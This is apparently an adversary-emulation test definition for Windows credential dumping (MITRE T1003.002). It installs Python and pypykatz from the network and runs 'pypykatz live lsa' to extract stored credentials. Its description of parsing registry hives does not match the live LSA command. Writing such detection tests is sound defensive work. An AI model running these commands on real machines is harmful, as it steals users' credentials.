api_version: "2.0"
name: Registry parse with pypykatz
description: |
    Parses registry hives to obtain stored credentials.

    Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
args:
    - name: venv_path
      type: string
      default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_002
uuid: a96872b2-cbf3-46cf-8eb4-27e8c0e85263
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.002: Security Account Manager'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Computer must have python 3 installed
      inline: |
        if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { {New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
        invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
        Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
        } }
      executor: powershell
    - name: |
        Computer must have venv configured at #{venv_path}
      inline: |
        if (Test-Path -Path "#{venv_path}") { exit 0 } else { {py -m venv "#{venv_path}"
        } }
      executor: powershell
    - name: "pypykatz must be installed \n"
      inline: |
        if (Get-Command "#{venv_path}\Scripts\pypykatz" -errorAction SilentlyContinue) { exit 0 } else { {& "#{venv_path}\Scripts\pip.exe" install --no-cache-dir pypykatz 2>&1 | Out-Null
        } }
      executor: powershell
    - name: registry-parse-with-pypykatz
      inline: "\"{{.Args.venv_path}}\\Scripts\\pypykatz\" live lsa \n"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
